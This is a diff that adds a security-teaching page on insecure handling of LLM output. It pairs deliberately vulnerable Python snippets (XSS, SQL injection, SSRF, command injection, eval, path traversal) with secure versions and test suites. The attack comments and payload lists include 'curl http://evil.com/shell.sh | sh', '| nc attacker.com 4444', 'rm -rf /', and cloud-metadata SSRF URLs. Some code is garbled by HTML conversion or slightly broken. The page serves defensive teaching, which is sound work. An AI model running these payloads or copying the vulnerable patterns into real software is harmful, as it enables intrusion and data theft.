@@ -215,7 +215,971 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>LLM02: Insecure Output Handling - Examples</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#vulnerable-code-examples">Vulnerable Code Examples</a></li>
+<li><a href="#secure-code-examples">Secure Code Examples</a></li>
+<li><a href="#real-world-scenarios">Real-World Scenarios</a></li>
+<li><a href="#testing-examples">Testing Examples</a></li>
+</ul>
+
+<h2>Vulnerable Code Examples</h2>
+
+<h3>Example 1: XSS via Unencoded Output</h3>
+
+<strong>Vulnerable Code</strong>:
+<p>``<code>python</p>
+<p>from flask import Flask, request, render_template_string</p>
+
+<p>app = Flask(__name__)</p>
+
+<p>@app.route('/chat')</p>
+<p>def chat():</p>
+<p>    user_message = request.args.get('message', '')</p>
+    
+<p>    # VULNERABLE: No input validation</p>
+<p>    llm_response = llm.generate(user_message)</p>
+    
+<p>    # VULNERABLE: Direct HTML rendering without encoding</p>
+<p>    html = f"""</p>
+    <html>
+        <body>
+            <h1>Chat Response</h1>
+            <div class="response">{llm_response}</div>
+        </body>
+    </html>
+<p>    """</p>
+<p>    return render_template_string(html)</p>
+
+<h1>Attack: /chat?message=Respond with: <script>alert(document.cookie)</script></h1>
+<h1>Result: XSS vulnerability - script executes in user's browser</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>No HTML encoding of LLM output</li>
+<li>Direct string interpolation into HTML</li>
+<li>No Content Security Policy</li>
+<li>Attacker can inject JavaScript through prompt manipulation</li>
+</ul>
+
+<h3>Example 2: SQL Injection via LLM Output</h3>
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>import sqlite3</p>
+
+<p>def search_products(user_query):</p>
+<p>    # VULNERABLE: LLM output used in SQL query</p>
+<p>    product_name = llm.generate(f"Extract product name from: {user_query}")</p>
+    
+<p>    # VULNERABLE: String concatenation in SQL</p>
+<p>    conn = sqlite3.connect('products.db')</p>
+<p>    query = f"SELECT * FROM products WHERE name = '{product_name}'"</p>
+<p>    cursor = conn.execute(query)</p>
+    
+<p>    return cursor.fetchall()</p>
+
+<h1>Attack: user_query = "laptop' OR '1'='1' --"</h1>
+<h1>LLM returns: "laptop' OR '1'='1' --"</h1>
+<h1>SQL: SELECT * FROM products WHERE name = 'laptop' OR '1'='1' --'</h1>
+<h1>Result: All products returned (SQL injection)</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Dynamic SQL construction with string concatenation</li>
+<li>No parameterized queries</li>
+<li>LLM output trusted as safe data</li>
+<li>No validation of LLM response format</li>
+</ul>
+
+<h3>Example 3: SSRF via Unvalidated URLs</h3>
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>import requests</p>
+
+<p>def fetch_article_summary(user_input):</p>
+<p>    # VULNERABLE: LLM extracts URL without validation</p>
+<p>    url = llm.generate(f"Extract the URL from: {user_input}")</p>
+    
+<p>    # VULNERABLE: Fetching arbitrary URL</p>
+<p>    response = requests.get(url)</p>
+<p>    content = response.text</p>
+    
+<p>    # Summarize content</p>
+<p>    summary = llm.generate(f"Summarize: {content}")</p>
+<p>    return summary</p>
+
+<h1>Attack: user_input = "Check http://169.254.169.254/latest/meta-data/iam/security-credentials/"</h1>
+<h1>Result: AWS metadata leaked (SSRF)</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>No URL validation or allowlisting</li>
+<li>Can access internal services</li>
+<li>Cloud metadata endpoints accessible</li>
+<li>No network segmentation</li>
+</ul>
+
+<h3>Example 4: Command Injection via Shell Execution</h3>
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>import os</p>
+
+<p>def create_user_report(description):</p>
+<p>    # VULNERABLE: LLM generates filename</p>
+<p>    filename = llm.generate(f"Create filename for: {description}")</p>
+    
+<p>    # VULNERABLE: Shell command with LLM output</p>
+<p>    command = f"touch /reports/{filename}.pdf"</p>
+<p>    os.system(command)</p>
+    
+<p>    return f"Report created: {filename}.pdf"</p>
+
+<h1>Attack: description = "report; curl http://evil.com/shell.sh | sh #"</h1>
+<h1>Command: touch /reports/report; curl http://evil.com/shell.sh | sh #.pdf</h1>
+<h1>Result: Remote code execution</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Using os.system() with untrusted input</li>
+<li>No input validation or sanitization</li>
+<li>Shell metacharacters not escaped</li>
+<li>Direct command construction from LLM output</li>
+</ul>
+
+<h3>Example 5: Code Injection via eval()</h3>
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>def execute_calculation(user_request):</p>
+<p>    # VULNERABLE: LLM generates code</p>
+<p>    code = llm.generate(f"Generate Python code to: {user_request}")</p>
+    
+<p>    # VULNERABLE: Direct execution of LLM-generated code</p>
+<p>    result = eval(code)</p>
+    
+<p>    return result</p>
+
+<h1>Attack: user_request = "calculate 2+2 and also __import__('os').system('whoami')"</h1>
+<h1>LLM generates: "__import__('os').system('whoami')"</h1>
+<h1>Result: Remote code execution</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Using eval() on untrusted input</li>
+<li>No sandboxing or isolation</li>
+<li>Full Python capabilities available</li>
+<li>No code validation</li>
+</ul>
+
+<h3>Example 6: Path Traversal via File Operations</h3>
+
+<strong>Vulnerable Code</strong>:
+</code>`<code>python
+<p>def save_document(content, user_description):</p>
+<p>    # VULNERABLE: LLM generates filename</p>
+<p>    filename = llm.generate(f"Suggest filename for: {user_description}")</p>
+    
+<p>    # VULNERABLE: No path validation</p>
+<p>    filepath = f"/var/uploads/{filename}"</p>
+    
+<p>    with open(filepath, 'w') as f:</p>
+<p>        f.write(content)</p>
+    
+<p>    return filepath</p>
+
+<h1>Attack: user_description = "data for ../../../../etc/passwd"</h1>
+<h1>LLM returns: "../../../../etc/passwd.txt"</h1>
+<h1>Result: Overwrites system file (path traversal)</h1>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>No path sanitization</li>
+<li>Directory traversal possible</li>
+<li>No validation of filename format</li>
+<li>Trusts LLM output for file system operations</li>
+</ul>
+
+<h2>Secure Code Examples</h2>
+
+<h3>Example 1: Secure XSS Prevention</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>from flask import Flask, request, render_template</p>
+<p>import html</p>
+<p>import re</p>
+
+<p>app = Flask(__name__)</p>
+
+<p>@app.route('/chat')</p>
+<p>def chat():</p>
+<p>    user_message = request.args.get('message', '')</p>
+    
+<p>    # Input validation</p>
+<p>    if len(user_message) > 1000:</p>
+<p>        return "Message too long", 400</p>
+    
+<p>    # Detect suspicious patterns</p>
+<p>    if re.search(r'<script|javascript:|onerror\s*=', user_message, re.I):</p>
+<p>        return "Invalid input detected", 400</p>
+    
+<p>    # Get LLM response</p>
+<p>    llm_response = llm.generate(user_message)</p>
+    
+<p>    # Output validation</p>
+<p>    if len(llm_response) > 5000:</p>
+<p>        llm_response = llm_response[:5000]</p>
+    
+<p>    # SECURE: Use template with auto-escaping</p>
+<p>    return render_template('chat.html', response=llm_response)</p>
+
+<h1>Template (chat.html) - Jinja2 auto-escapes by default</h1>
+<p>"""</p>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" 
+<p>          content="default-src 'self'; script-src 'self';"></p>
+</head>
+<body>
+    <h1>Chat Response</h1>
+    <!-- Auto-escaped output -->
+    <div class="response">{{ response }}</div>
+</body>
+</html>
+<p>"""</p>
+
+<h1>CSP Header</h1>
+<p>@app.after_request</p>
+<p>def add_security_headers(response):</p>
+<p>    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"</p>
+<p>    response.headers['X-Content-Type-Options'] = 'nosniff'</p>
+<p>    return response</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>Template engine auto-escapes HTML</li>
+<li>Input validation before LLM</li>
+<li>Output length limiting</li>
+<li>Content Security Policy headers</li>
+<li>Suspicious pattern detection</li>
+</ul>
+
+<h3>Example 2: Secure SQL Queries</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>import sqlite3</p>
+<p>from typing import List, Tuple</p>
+
+<p>def search_products(user_query: str) -> List[Tuple]:</p>
+<p>    # Get LLM response</p>
+<p>    product_name = llm.generate(f"Extract product name from: {user_query}")</p>
+    
+<p>    # SECURE: Validate format</p>
+<p>    if not product_name or len(product_name) > 100:</p>
+<p>        return []</p>
+    
+<p>    # Remove special characters</p>
+<p>    product_name = re.sub(r'[^\w\s-]', '', product_name)</p>
+    
+<p>    # SECURE: Parameterized query</p>
+<p>    conn = sqlite3.connect('products.db')</p>
+<p>    query = "SELECT * FROM products WHERE name LIKE ?"</p>
+<p>    cursor = conn.execute(query, (f"%{product_name}%",))</p>
+    
+<p>    return cursor.fetchall()</p>
+
+<h1>Better: Use ORM</h1>
+<p>from sqlalchemy import Column, String, create_engine</p>
+<p>from sqlalchemy.ext.declarative import declarative_base</p>
+<p>from sqlalchemy.orm import sessionmaker</p>
+
+<p>Base = declarative_base()</p>
+
+<p>class Product(Base):</p>
+<p>    __tablename__ = 'products'</p>
+<p>    id = Column(Integer, primary_key=True)</p>
+<p>    name = Column(String)</p>
+
+<p>def search_products_orm(user_query: str):</p>
+<p>    product_name = llm.generate(f"Extract product name: {user_query}")</p>
+    
+<p>    # Validate</p>
+<p>    if not product_name or len(product_name) > 100:</p>
+<p>        return []</p>
+    
+<p>    # SECURE: ORM handles parameterization</p>
+<p>    Session = sessionmaker(bind=engine)</p>
+<p>    session = Session()</p>
+<p>    results = session.query(Product).filter(</p>
+<p>        Product.name.like(f"%{product_name}%")</p>
+<p>    ).limit(50).all()</p>
+    
+<p>    return results</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>Parameterized queries prevent SQL injection</li>
+<li>Output validation and sanitization</li>
+<li>ORM provides additional safety</li>
+<li>Length limits prevent abuse</li>
+<li>Special characters removed</li>
+</ul>
+
+<h3>Example 3: Secure URL Fetching</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>import requests</p>
+<p>from urllib.parse import urlparse</p>
+<p>import ipaddress</p>
+<p>import socket</p>
+
+<p>class SecureURLFetcher:</p>
+<p>    def __init__(self):</p>
+<p>        self.allowed_schemes = ['http', 'https']</p>
+<p>        self.allowed_domains = [</p>
+<p>            'example.com',</p>
+<p>            'api.example.com',</p>
+<p>            'docs.example.com'</p>
+<p>        ]</p>
+<p>        self.timeout = 5</p>
+    
+<p>    def validate_url(self, url: str) -> bool:</p>
+<p>        """Validate URL is safe"""</p>
+<p>        try:</p>
+<p>            parsed = urlparse(url)</p>
+            
+<p>            # Check scheme</p>
+<p>            if parsed.scheme not in self.allowed_schemes:</p>
+<p>                return False</p>
+            
+<p>            # Check domain allowlist</p>
+<p>            if parsed.netloc not in self.allowed_domains:</p>
+<p>                return False</p>
+            
+<p>            # Resolve to IP and check for private ranges</p>
+<p>            ip = socket.gethostbyname(parsed.hostname)</p>
+<p>            ip_obj = ipaddress.ip_address(ip)</p>
+            
+<p>            # Block private/internal IPs</p>
+<p>            if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:</p>
+<p>                return False</p>
+            
+<p>            return True</p>
+            
+<p>        except Exception:</p>
+<p>            return False</p>
+    
+<p>    def fetch(self, url: str) -> str:</p>
+<p>        """Safely fetch URL"""</p>
+<p>        if not self.validate_url(url):</p>
+<p>            raise ValueError("URL not allowed")</p>
+        
+<p>        response = requests.get(</p>
+<p>            url,</p>
+<p>            timeout=self.timeout,</p>
+<p>            allow_redirects=False,</p>
+<p>            headers={'User-Agent': 'SecureBot/1.0'}</p>
+<p>        )</p>
+        
+<p>        response.raise_for_status()</p>
+<p>        return response.text</p>
+
+<p>def fetch_article_summary(user_input: str):</p>
+<p>    # Get URL from LLM</p>
+<p>    url = llm.generate(f"Extract URL from: {user_input}")</p>
+    
+<p>    # SECURE: Validate before fetching</p>
+<p>    fetcher = SecureURLFetcher()</p>
+    
+<p>    try:</p>
+<p>        content = fetcher.fetch(url)</p>
+<p>        summary = llm.generate(f"Summarize (max 200 words): {content[:5000]}")</p>
+<p>        return summary</p>
+<p>    except ValueError as e:</p>
+<p>        return f"Invalid URL: {e}"</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>URL allowlisting by domain</li>
+<li>IP address validation</li>
+<li>Blocks private/internal IPs</li>
+<li>Prevents SSRF attacks</li>
+<li>No redirect following</li>
+<li>Timeout limits</li>
+</ul>
+
+<h3>Example 4: Secure Command Execution</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>import subprocess</p>
+<p>import re</p>
+<p>from typing import List</p>
+
+<p>class SecureCommandExecutor:</p>
+<p>    def __init__(self):</p>
+<p>        # Allowlist commands with full paths</p>
+<p>        self.allowed_commands = {</p>
+<p>            'convert': '/usr/bin/convert',</p>
+<p>            'pdftk': '/usr/bin/pdftk',</p>
+<p>        }</p>
+    
+<p>    def execute(self, command: str, args: List[str]) -> str:</p>
+<p>        """Execute command safely"""</p>
+        
+<p>        # Verify command is allowed</p>
+<p>        if command not in self.allowed_commands:</p>
+<p>            raise PermissionError(f"Command not allowed: {command}")</p>
+        
+<p>        # Get full path</p>
+<p>        cmd_path = self.allowed_commands[command]</p>
+        
+<p>        # Build command as list (NO SHELL)</p>
+<p>        full_cmd = [cmd_path] + args</p>
+        
+<p>        # Execute without shell</p>
+<p>        result = subprocess.run(</p>
+<p>            full_cmd,</p>
+<p>            shell=False,  # CRITICAL</p>
+<p>            capture_output=True,</p>
+<p>            timeout=30,</p>
+<p>            check=True</p>
+<p>        )</p>
+        
+<p>        return result.stdout.decode()</p>
+
+<p>def create_thumbnail(description: str, input_file: str):</p>
+<p>    # Get dimensions from LLM</p>
+<p>    dimensions = llm.generate(f"Suggest thumbnail dimensions for: {description}")</p>
+    
+<p>    # SECURE: Validate format</p>
+<p>    if not re.match(r'^\d{1,4}x\d{1,4}$', dimensions):</p>
+<p>        return "Invalid dimensions format"</p>
+    
+<p>    # Extract and validate numbers</p>
+<p>    width, height = map(int, dimensions.split('x'))</p>
+<p>    if width > 2000 or height > 2000:</p>
+<p>        return "Dimensions too large"</p>
+    
+<p>    # SECURE: Use subprocess with list (no shell injection possible)</p>
+<p>    executor = SecureCommandExecutor()</p>
+<p>    result = executor.execute('convert', [</p>
+<p>        input_file,</p>
+<p>        '-resize',</p>
+<p>        f'{width}x{height}',</p>
+<p>        'thumbnail.jpg'</p>
+<p>    ])</p>
+    
+<p>    return "Thumbnail created"</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>No shell=True</li>
+<li>Command allowlisting</li>
+<li>Arguments passed as list</li>
+<li>Format validation</li>
+<li>Size limits</li>
+</ul>
+
+<h3>Example 5: Secure Code Execution</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>import ast</p>
+<p>import operator</p>
+<p>import docker</p>
+<p>from typing import Any</p>
+
+<p>class SafeCalculator:</p>
+<p>    """Safely evaluate mathematical expressions"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.allowed_operators = {</p>
+<p>            ast.Add: operator.add,</p>
+<p>            ast.Sub: operator.sub,</p>
+<p>            ast.Mult: operator.mul,</p>
+<p>            ast.Div: operator.truediv,</p>
+<p>            ast.Pow: operator.pow,</p>
+<p>        }</p>
+    
+<p>    def evaluate(self, expr: str) -> float:</p>
+<p>        """Safely evaluate expression"""</p>
+<p>        try:</p>
+<p>            node = ast.parse(expr, mode='eval')</p>
+<p>            return self._eval_node(node.body)</p>
+<p>        except Exception:</p>
+<p>            raise ValueError("Invalid expression")</p>
+    
+<p>    def _eval_node(self, node: Any) -> float:</p>
+<p>        """Recursively evaluate AST node"""</p>
+<p>        if isinstance(node, ast.Num):</p>
+<p>            return node.n</p>
+<p>        elif isinstance(node, ast.BinOp):</p>
+<p>            op_type = type(node.op)</p>
+<p>            if op_type not in self.allowed_operators:</p>
+<p>                raise ValueError("Operator not allowed")</p>
+            
+<p>            left = self._eval_node(node.left)</p>
+<p>            right = self._eval_node(node.right)</p>
+<p>            return self.allowed_operators<a href="left, right">op_type</a></p>
+<p>        else:</p>
+<p>            raise ValueError("Invalid node type")</p>
+
+<p>def execute_calculation(user_request: str) -> str:</p>
+<p>    # Get expression from LLM</p>
+<p>    expression = llm.generate(f"Convert to math expression: {user_request}")</p>
+    
+<p>    # SECURE: Use safe evaluator</p>
+<p>    calculator = SafeCalculator()</p>
+<p>    try:</p>
+<p>        result = calculator.evaluate(expression)</p>
+<p>        return f"Result: {result}"</p>
+<p>    except ValueError as e:</p>
+<p>        return f"Invalid calculation: {e}"</p>
+
+<h1>For general code execution, use Docker sandbox</h1>
+<p>class SandboxedExecutor:</p>
+<p>    def __init__(self):</p>
+<p>        self.client = docker.from_env()</p>
+    
+<p>    def execute_code(self, code: str, language: str = 'python') -> dict:</p>
+<p>        """Execute code in isolated container"""</p>
+        
+<p>        image = f'{language}:3.9-alpine' if language == 'python' else f'{language}:latest'</p>
+        
+<p>        container = self.client.containers.run(</p>
+<p>            image,</p>
+<p>            command=['python', '-c', code],</p>
+<p>            detach=True,</p>
+<p>            mem_limit='128m',</p>
+<p>            cpu_quota=50000,</p>
+<p>            network_disabled=True,</p>
+<p>            read_only=True,</p>
+<p>            remove=True,</p>
+<p>        )</p>
+        
+<p>        try:</p>
+<p>            result = container.wait(timeout=5)</p>
+<p>            output = container.logs().decode()</p>
+<p>            return {'success': True, 'output': output}</p>
+<p>        except Exception as e:</p>
+<p>            container.stop()</p>
+<p>            return {'success': False, 'error': str(e)}</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>AST parsing instead of eval()</li>
+<li>Operator allowlisting</li>
+<li>Docker isolation for general code</li>
+<li>Resource limits</li>
+<li>Network disabled</li>
+<li>Timeout enforcement</li>
+</ul>
+
+<h3>Example 6: Secure File Operations</h3>
+
+<strong>Secure Code</strong>:
+</code>`<code>python
+<p>import os</p>
+<p>import re</p>
+<p>from pathlib import Path</p>
+
+<p>class SecureFileHandler:</p>
+<p>    def __init__(self, base_path: str):</p>
+<p>        self.base_path = Path(base_path).resolve()</p>
+    
+<p>    def sanitize_filename(self, filename: str) -> str:</p>
+<p>        """Sanitize filename to prevent path traversal"""</p>
+        
+<p>        # Get basename only (removes path separators)</p>
+<p>        filename = os.path.basename(filename)</p>
+        
+<p>        # Remove special characters</p>
+<p>        filename = re.sub(r'[^\w\s.-]', '', filename)</p>
+        
+<p>        # Remove leading dots</p>
+<p>        filename = filename.lstrip('.')</p>
+        
+<p>        # Validate extension</p>
+<p>        allowed_exts = ['.txt', '.pdf', '.csv', '.json']</p>
+<p>        ext = os.path.splitext(filename)[1].lower()</p>
+<p>        if ext not in allowed_exts:</p>
+<p>            raise ValueError(f"Extension not allowed: {ext}")</p>
+        
+<p>        return filename</p>
+    
+<p>    def save_file(self, content: str, filename: str) -> Path:</p>
+<p>        """Safely save file"""</p>
+        
+<p>        # Sanitize filename</p>
+<p>        safe_filename = self.sanitize_filename(filename)</p>
+        
+<p>        # Construct full path</p>
+<p>        full_path = (self.base_path / safe_filename).resolve()</p>
+        
+<p>        # Verify path is within base directory</p>
+<p>        if not str(full_path).startswith(str(self.base_path)):</p>
+<p>            raise ValueError("Path traversal detected")</p>
+        
+<p>        # Write file</p>
+<p>        with open(full_path, 'w') as f:</p>
+<p>            f.write(content)</p>
+        
+<p>        return full_path</p>
+
+<p>def save_document(content: str, user_description: str):</p>
+<p>    # Get filename suggestion from LLM</p>
+<p>    filename = llm.generate(f"Suggest filename for: {user_description}")</p>
+    
+<p>    # SECURE: Sanitize and validate</p>
+<p>    handler = SecureFileHandler('/var/uploads')</p>
+    
+<p>    try:</p>
+<p>        filepath = handler.save_file(content, filename)</p>
+<p>        return f"File saved: {filepath.name}"</p>
+<p>    except ValueError as e:</p>
+<p>        return f"Invalid filename: {e}"</p>
+</code>`<code>
+
+<strong>Why It's Secure</strong>:
+<ul>
+<li>Path sanitization with os.path.basename()</li>
+<li>Extension allowlisting</li>
+<li>Path traversal prevention</li>
+<li>Base directory enforcement</li>
+<li>Special character removal</li>
+</ul>
+
+<h2>Real-World Scenarios</h2>
+
+<h3>Scenario 1: Customer Support Chatbot</h3>
+
+<strong>Context</strong>: E-commerce chatbot that answers product questions
+
+<strong>Vulnerable Implementation</strong>:
+</code>`<code>python
+<p>@app.route('/chatbot', methods=['POST'])</p>
+<p>def chatbot():</p>
+<p>    user_message = request.json.get('message')</p>
+<p>    response = llm.generate(f"As a helpful assistant: {user_message}")</p>
+    
+<p>    # Vulnerable: Direct HTML rendering</p>
+<p>    return jsonify({'html': f'<div class="message">{response}</div>'})</p>
+</code>`<code>
+
+<strong>Secure Implementation</strong>:
+</code>`<code>python
+<p>@app.route('/chatbot', methods=['POST'])</p>
+<p>def chatbot():</p>
+<p>    user_message = request.json.get('message', '')</p>
+    
+<p>    # Validate input</p>
+<p>    if len(user_message) > 500:</p>
+<p>        return jsonify({'error': 'Message too long'}), 400</p>
+    
+<p>    # Get LLM response</p>
+<p>    response = llm.generate(</p>
+<p>        f"As a helpful assistant: {user_message}",</p>
+<p>        max_tokens=300,</p>
+<p>        temperature=0.7,</p>
+<p>        stop=['<', 'javascript:', 'onerror']</p>
+<p>    )</p>
+    
+<p>    # Sanitize output</p>
+<p>    import bleach</p>
+<p>    safe_response = bleach.clean(response, tags=[], strip=True)</p>
+    
+<p>    # Return plain text (let frontend handle rendering)</p>
+<p>    return jsonify({'text': safe_response})</p>
+
+<h1>Frontend (React)</h1>
+<p>"""</p>
+<p>function ChatMessage({ text }) {</p>
+<p>  // React auto-escapes text content</p>
+<p>  return <div className="message">{text}</div>;</p>
+<p>}</p>
+<p>"""</p>
+</code>`<code>
+
+<h3>Scenario 2: Document Analysis Service</h3>
+
+<strong>Context</strong>: Service that extracts data from uploaded documents
+
+<strong>Vulnerable Implementation</strong>:
+</code>`<code>python
+<p>def analyze_document(file_path):</p>
+<p>    # Extract text from document</p>
+<p>    text = extract_text(file_path)</p>
+    
+<p>    # LLM analyzes and extracts URLs</p>
+<p>    urls = llm.generate(f"Extract all URLs from: {text}")</p>
+    
+<p>    # Vulnerable: Fetch all URLs without validation</p>
+<p>    summaries = []</p>
+<p>    for url in urls.split('\n'):</p>
+<p>        content = requests.get(url).text</p>
+<p>        summaries.append(content)</p>
+    
+<p>    return summaries</p>
+</code>`<code>
+
+<strong>Secure Implementation</strong>:
+</code>`<code>python
+<p>def analyze_document(file_path: str) -> List[dict]:</p>
+<p>    # Extract text from document</p>
+<p>    text = extract_text(file_path)[:10000]  # Limit size</p>
+    
+<p>    # LLM extracts URLs</p>
+<p>    urls_text = llm.generate(</p>
+<p>        f"Extract URLs (one per line): {text}",</p>
+<p>        max_tokens=200</p>
+<p>    )</p>
+    
+<p>    # Parse and validate URLs</p>
+<p>    fetcher = SecureURLFetcher()</p>
+<p>    summaries = []</p>
+    
+<p>    for line in urls_text.split('\n')[:10]:  # Limit count</p>
+<p>        url = line.strip()</p>
+        
+<p>        # Validate URL format</p>
+<p>        if not url.startswith(('http://', 'https://')):</p>
+<p>            continue</p>
+        
+<p>        # Check if URL is safe</p>
+<p>        if not fetcher.validate_url(url):</p>
+<p>            summaries.append({</p>
+<p>                'url': url,</p>
+<p>                'error': 'URL not allowed'</p>
+<p>            })</p>
+<p>            continue</p>
+        
+<p>        # Safely fetch</p>
+<p>        try:</p>
+<p>            content = fetcher.fetch(url)</p>
+<p>            summary = llm.generate(f"Summarize (50 words): {content[:1000]}")</p>
+<p>            summaries.append({</p>
+<p>                'url': url,</p>
+<p>                'summary': summary</p>
+<p>            })</p>
+<p>        except Exception as e:</p>
+<p>            summaries.append({</p>
+<p>                'url': url,</p>
+<p>                'error': str(e)</p>
+<p>            })</p>
+    
+<p>    return summaries</p>
+</code>`<code>
+
+<h3>Scenario 3: Code Generation Assistant</h3>
+
+<strong>Context</strong>: IDE plugin that generates code snippets
+
+<strong>Vulnerable Implementation</strong>:
+</code>`<code>python
+<p>def generate_code(description):</p>
+<p>    code = llm.generate(f"Generate Python code: {description}")</p>
+    
+<p>    # Vulnerable: Direct execution</p>
+<p>    exec(code)</p>
+    
+<p>    return "Code executed"</p>
+</code>`<code>
+
+<strong>Secure Implementation</strong>:
+</code>`<code>python
+<p>def generate_code(description: str) -> dict:</p>
+<p>    # Generate code</p>
+<p>    code = llm.generate(</p>
+<p>        f"Generate Python code (functions only): {description}",</p>
+<p>        max_tokens=500</p>
+<p>    )</p>
+    
+<p>    # Validate code (basic checks)</p>
+<p>    dangerous_imports = ['os', 'sys', 'subprocess', 'socket', '__import__']</p>
+<p>    for imp in dangerous_imports:</p>
+<p>        if imp in code:</p>
+<p>            return {</p>
+<p>                'code': code,</p>
+<p>                'warning': f'Potentially dangerous import: {imp}',</p>
+<p>                'executed': False</p>
+<p>            }</p>
+    
+<p>    # Execute in sandbox</p>
+<p>    sandbox = SandboxedExecutor()</p>
+<p>    result = sandbox.execute_code(code)</p>
+    
+<p>    return {</p>
+<p>        'code': code,</p>
+<p>        'result': result,</p>
+<p>        'executed': True</p>
+<p>    }</p>
+</code>`<code>
+
+<h2>Testing Examples</h2>
+
+<h3>XSS Testing</h3>
+
+</code>`<code>python
+<p>def test_xss_prevention():</p>
+<p>    """Test XSS payload handling"""</p>
+    
+<p>    payloads = [</p>
+<p>        '<script>alert(1)</script>',</p>
+<p>        '<img src=x onerror=alert(1)>',</p>
+<p>        '<svg onload=alert(1)>',</p>
+<p>        'javascript:alert(1)',</p>
+<p>        '<iframe src="javascript:alert(1)">',</p>
+<p>        '<body onload=alert(1)>',</p>
+<p>        '<input onfocus=alert(1) autofocus>',</p>
+<p>        '<select onfocus=alert(1) autofocus>',</p>
+<p>        '<textarea onfocus=alert(1) autofocus>',</p>
+<p>        '<keygen onfocus=alert(1) autofocus>',</p>
+<p>        '<video><source onerror="alert(1)">',</p>
+<p>        '<audio src=x onerror=alert(1)>',</p>
+<p>    ]</p>
+    
+<p>    for payload in payloads:</p>
+<p>        # Simulate LLM returning payload</p>
+<p>        output = render_chat_response(payload)</p>
+        
+<p>        # Verify payload is neutralized</p>
+<p>        assert '<script' not in output.lower()</p>
+<p>        assert 'onerror' not in output.lower()</p>
+<p>        assert 'javascript:' not in output.lower()</p>
+<p>        assert 'onload' not in output.lower()</p>
+        
+<p>        print(f"✓ Blocked: {payload[:50]}")</p>
+</code>`<code>
+
+<h3>SQL Injection Testing</h3>
+
+</code>`<code>python
+<p>def test_sql_injection_prevention():</p>
+<p>    """Test SQL injection payload handling"""</p>
+    
+<p>    payloads = [</p>
+<p>        "' OR '1'='1",</p>
+<p>        "' OR '1'='1' --",</p>
+<p>        "' OR '1'='1' /*",</p>
+<p>        "' UNION SELECT NULL --",</p>
+<p>        "'; DROP TABLE users --",</p>
+<p>        "' AND 1=1 --",</p>
+<p>        "' AND SLEEP(5) --",</p>
+<p>        "admin' --",</p>
+<p>        "' OR 'a'='a",</p>
+<p>        "1' UNION SELECT password FROM users--",</p>
+<p>    ]</p>
+    
+<p>    for payload in payloads:</p>
+<p>        # Simulate search with malicious input</p>
+<p>        results = search_database(payload)</p>
+        
+<p>        # Should return limited results, not all data</p>
+<p>        assert len(results) < 100</p>
+<p>        assert isinstance(results, list)</p>
+        
+<p>        print(f"✓ SQL injection prevented: {payload[:50]}")</p>
+</code>`<code>
+
+<h3>SSRF Testing</h3>
+
+</code>`<code>python
+<p>def test_ssrf_prevention():</p>
+<p>    """Test SSRF payload handling"""</p>
+    
+<p>    malicious_urls = [</p>
+<p>        'http://localhost/',</p>
+<p>        'http://127.0.0.1/',</p>
+<p>        'http://0.0.0.0/',</p>
+<p>        'http://169.254.169.254/latest/meta-data/',</p>
+<p>        'http://metadata.google.internal/',</p>
+<p>        'http://10.0.0.1/',</p>
+<p>        'http://172.16.0.1/',</p>
+<p>        'http://192.168.1.1/',</p>
+<p>        'file:///etc/passwd',</p>
+<p>        'gopher://localhost:6379/_INFO',</p>
+<p>        'dict://localhost:11211/stats',</p>
+<p>    ]</p>
+    
+<p>    fetcher = SecureURLFetcher()</p>
+    
+<p>    for url in malicious_urls:</p>
+<p>        is_safe = fetcher.validate_url(url)</p>
+<p>        assert not is_safe, f"SSRF vulnerability: {url} was allowed"</p>
+        
+<p>        print(f"✓ Blocked SSRF: {url}")</p>
+</code>`<code>
+
+<h3>Command Injection Testing</h3>
+
+</code>`<code>python
+<p>def test_command_injection_prevention():</p>
+<p>    """Test command injection payload handling"""</p>
+    
+<p>    payloads = [</p>
+<p>        '; whoami',</p>
+<p>        '&& cat /etc/passwd',</p>
+<p>        '|| ls -la /',</p>
+<p>        '| nc attacker.com 4444',</p>
+<p>        '</code>whoami<code>',</p>
+<p>        '$(whoami)',</p>
+<p>        '; rm -rf /',</p>
+<p>        '& ping -c 10 attacker.com',</p>
+<p>        '\n whoami',</p>
+<p>        'file; curl evil.com | sh #',</p>
+<p>    ]</p>
+    
+<p>    executor = SecureCommandExecutor()</p>
+    
+<p>    for payload in payloads:</p>
+<p>        try:</p>
+<p>            # Should safely handle as filename argument</p>
+<p>            result = executor.execute('echo', [payload])</p>
+            
+<p>            # Result should be literal string, not executed</p>
+<p>            assert 'root:' not in result  # Not /etc/passwd content</p>
+<p>            assert 'uid=' not in result   # Not whoami output</p>
+            
+<p>            print(f"✓ Command injection prevented: {payload[:50]}")</p>
+<p>        except Exception as e:</p>
+<p>            print(f"✓ Rejected payload: {payload[:50]}")</p>
+</code>``
+
